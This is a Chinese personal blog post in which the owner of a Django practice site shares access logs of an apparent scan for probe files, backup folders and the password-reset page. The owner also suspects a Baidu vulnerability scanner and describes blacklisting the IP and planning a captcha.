+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /ascii_art/text/jspcheck.jsp 404 0.013 0.013 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/tz.jsp 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /ascii_art/img/jspcheck.jsp 404 0.015 0.015 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /blog/tag/jspcheck.jsp 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /accounts/login/jspcheck.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:24 +0800] /blog/type/jspcheck.jsp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:17:59:23 +0800] /ascii_art/jspcheck.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:23 +0800] /accounts/jspcheck.jsp 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:17:59:07 +0800] /civitas/jspcheck.jsp 404 0.016 0.016 4477 
+      183.60.243.234 [05/Mar/2015:17:59:08 +0800] /civitas/tz.jsp 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:59:07 +0800] /tz.jsp 404 0.045 0.045 4477 
+      183.60.243.234 [05/Mar/2015:17:59:06 +0800] /blog/tz.jsp 404 0.009 0.009 4477 
+      183.60.243.234 [05/Mar/2015:17:59:04 +0800] /jspcheck.jsp 404 0.025 0.025 4477 
+      183.60.243.234 [05/Mar/2015:17:59:04 +0800] /blog/jspcheck.jsp 404 0.017 0.017 4477 
+    #我想怎么不注册个用户呢。。。
+      183.60.243.234 [05/Mar/2015:17:58:09 +0800] /accounts/register 301 0.003 0.003 0
+    # 这些是在找什么东西来着？
+      183.60.243.234 [05/Mar/2015:17:58:04 +0800] /backup/ 404 0.008 0.008 4477 
+      183.60.243.234 [05/Mar/2015:17:58:03 +0800] /bk/ 404 0.450 0.450 4477 
+      183.60.243.234 [05/Mar/2015:17:58:00 +0800] /bak/ 404 0.013 0.013 4477 
+    #我想说我把django的email设置删掉了，你能reset什么password呢。。。
+      183.60.243.234 [05/Mar/2015:17:58:00 +0800] /accounts/reset_password/ 200 0.450 0.450 1455 
+      183.60.243.234 [05/Mar/2015:17:57:59 +0800] /old/ 404 0.012 0.012 4477 
+      183.60.243.234 [05/Mar/2015:17:57:56 +0800] /robots.txt 404 0.509 0.509 4477 
+
+我想说的是，我这个只是架在新浪云上面的一个练手用的blog站点。。。后面用django写的。。。。不用在[/blog/post/8/](/blog/post/8/) 上面发那么多没用评论吧。。。
+
+django的安全好像做得还行。。。。
+
+好像我很懒，一直没做验证码，看来还是需要的。。。。
+
+详细的日志要明天去下下来，大概10分钟访问掉我10个云豆左右（1角钱？）
+
+
+----------
+
+3月6日更新
+
+其实我有点怀疑是不是百度的站长工具里面的漏洞检测爬虫
+
+    www.jithee.name没有检测出漏洞问题
+    检测时间：2015-03-05 18:08:16
+
+这个时间和攻击结束时间差不多，不过我还是比较纳闷的是最后2分钟基本就在对着[/blog/post/8/](/blog/post/8/)post，然后对着admin post交替
+
+要是经常光顾就可能不是善意的了，反正已经加到新浪云防火墙黑名单里面去了，看以后拦截次数了
+
+我决定周末把验证码加上去，顺便弄个robots保护下admin，虽然我很相信django的安全。。
